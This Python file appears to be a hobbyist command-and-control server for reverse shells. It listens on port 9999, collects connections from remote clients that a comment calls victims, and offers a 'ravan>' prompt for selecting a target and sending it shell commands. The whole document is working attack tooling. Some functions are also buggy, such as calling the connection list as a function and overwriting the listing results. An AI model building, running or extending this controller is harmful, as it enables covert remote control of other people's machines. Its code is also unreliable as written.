from concurrent.futures import thread
from http import client
import queue
import socket
import sys
import threading
import time
from queue import Queue
from tokenize import Number
from unittest import result


Number_of_threads = 2
Job_Number = [1,2]
queue = Queue()
all_connections = []
all_address = []

# Create a Socket ( connect two computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()


#' Establish connection with a client (socket must be listening)

#def socket_accept():
#    conn, address = s.accept()
#    print("Connection has been established! |" + " IP " + address[0] + " | Port" + str(address[1]))
#    send_commands(conn)
#    conn.close()

# Send commands to client/victim or a friend
#def send_commands(conn):
#    while True:
#        cmd = input()
#        if cmd == 'quit':
#            conn.close()
#            s.close()
#            sys.exit()
#        if len(str.encode(cmd)) > 0:
#            conn.send(str.encode(cmd))
#            client_response = str(conn.recv(1024),"utf-8")
#            print(client_response, end="")


#def main():
#    create_socket()
#    bind_socket()
#    socket_accept()


#main()       



# Handling connection frpm multiple client 


def accepting_connection():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn,address = s.accept()
            s.setblocking(1) 
            all_connections.append(conn)
            all_address.append(address)
            print("connrction has been established" + address[0])
        except:
            print("Error accepting connection")


## send command to the connected

def start_ravan():

  while True:
    cmd = input('ravan>')
    
    if cmd == 'list':
        list_connections()

    elif 'select' in cmd:
        conn = get_target(cmd)
        if conn is not None:
            send_target_commands(conn)
    else:
        print("command not recognized")

## display all connection


def list_connections():
    results = ''

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)

        except:
            del all_connections[i]
            del all_address[i]
            continue    
        results = str(i) + ' ' + str(all_address[i][0]) + ' ' + str(all_address[i][0] + '\n')
    print("............ Client..." + '\n' + results)

## selecting the target

def get_target(cmd):

    try:
        target = cmd.replace('select','')
        target = int(target)
        conn = all_connections(target)
        print("You are now connected to:" + str(all_connections[target][0])) 
        print(str(all_address[target][0]) + '>',end="")
        return conn
    except:
        print("Selection not valid")
        return None       

## send coomand 

def send_target_commands(conn):
    while True:
        try:

            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0 :
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480),"utf-8")
                print(client_response,end="")

        except:
            print("error sending command") 
            break   


## create worker threds
def create_workers():
    for _ in range(Number_of_threads):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


def work():
    while True:
      x = queue.get()
      if x == 1:
         create_socket()
         bind_socket()
         accepting_connection()
      if x == 2 :
        start_ravan()

      queue.task_done()


def create_jobs():

    for x in Job_Number:
        queue.put(x)
    queue.join()

create_workers()       
create_jobs()





















